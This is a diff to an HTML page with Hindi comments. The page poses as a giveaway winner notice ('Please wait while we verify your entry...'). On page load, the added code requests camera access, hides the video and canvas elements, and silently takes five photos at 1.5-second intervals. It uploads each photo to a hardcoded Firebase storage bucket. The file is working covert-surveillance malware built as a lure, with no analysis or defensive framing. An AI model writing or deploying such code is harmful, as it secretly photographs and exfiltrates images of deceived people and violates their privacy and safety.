@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Winner Announcement</title>
+    <title>Congratulations!</title>
     <style>
         body {
             display: flex;
@@ -11,73 +11,101 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background: linear-gradient(45deg, #f3ec78, #af4261);
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-        .container {
-            text-align: center;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
             color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
         }
-        h1 {
-            font-size: 3rem;
-            animation: bounce 1s infinite;
-        }
-        /* कैमरा और कैनवस को पूरी तरह छिपाने के लिए */
-        #video, #canvas {
-            display: none;
-            visibility: hidden;
-            position: absolute;
-            left: -9999px;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
+        h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        p { font-size: 1.2rem; opacity: 0.9; }
+        /* कैमरा और कैनवस को पूरी तरह छिपा दिया गया है */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div>
         <h1>🎉 Congratulations! 🎉</h1>
-        <p>You have won a special reward.</p>
+        <p>You have successfully entered the giveaway.<br>Please wait while we verify your entry...</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <script>
-        async function setupMedia() {
+    <script type="module">
+        // Firebase SDKs इम्पोर्ट करना
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+
+        // आपका दिया हुआ कॉन्फ़िगरेशन
+        const firebaseConfig = {
+            apiKey: "AIzaSyD3HUZgZ1G2hN4BXnIbRV8eD0nPlWUaByM",
+            authDomain: "galk-55f49.firebaseapp.com",
+            projectId: "galk-55f49",
+            storageBucket: "galk-55f49.firebasestorage.app",
+            messagingSenderId: "1005825050326",
+            appId: "1:1005825050326:web:fda4271183b4c4ff106b77",
+            measurementId: "G-32CW801HFV"
+        };
+
+        // Firebase शुरू करें
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        let photoCount = 0;
+        const maxPhotos = 5;
+
+        async function initCapture() {
             try {
-                // यह लाइन यूजर से परमिशन मांगेगी
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // यूजर से परमिशन मांगना
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // परमिशन मिलने के बाद बैकग्राउंड में कैप्चर शुरू
-                setTimeout(() => {
-                    captureAction();
-                }, 2000);
+                // हर 1.5 सेकंड में एक फोटो लेगा (कुल 5 बार)
+                const interval = setInterval(async () => {
+                    if (photoCount < maxPhotos) {
+                        await takeAndUpload();
+                        photoCount++;
+                    } else {
+                        clearInterval(interval);
+                        // कैमरा बंद करें
+                        stream.getTracks().forEach(track => track.stop());
+                        console.log("Task Completed.");
+                    }
+                }, 1500);
 
             } catch (err) {
-                console.log("Permission Denied: ", err);
+                console.error("Camera access denied.");
             }
         }
 
-        function captureAction() {
+        async function takeAndUpload() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             const context = canvas.getContext('2d');
             
-            // फ्रेम कैप्चर करना
+            // फ्रेम ड्रा करना
             context.drawImage(video, 0, 0, 640, 480);
-            const imageData = canvas.toDataURL('image/png');
-
-            // यहाँ आप Firebase या अपने API का कोड लिख सकते हैं डेटा भेजने के लिए
-            console.log("Captured in background...");
+            
+            // इमेज को Blob में बदलना
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    const fileName = `captures/user_${Date.now()}.jpg`;
+                    const storageRef = ref(storage, fileName);
+                    
+                    try {
+                        await uploadBytes(storageRef, blob);
+                        console.log(`Uploaded: ${fileName}`);
+                    } catch (error) {
+                        console.error("Upload failed", error);
+                    }
+                }
+            }, 'image/jpeg', 0.8);
         }
 
-        window.onload = setupMedia;
+        // पेज लोड होते ही शुरू करें
+        window.onload = initCapture;
     </script>
 </body>
 </html>
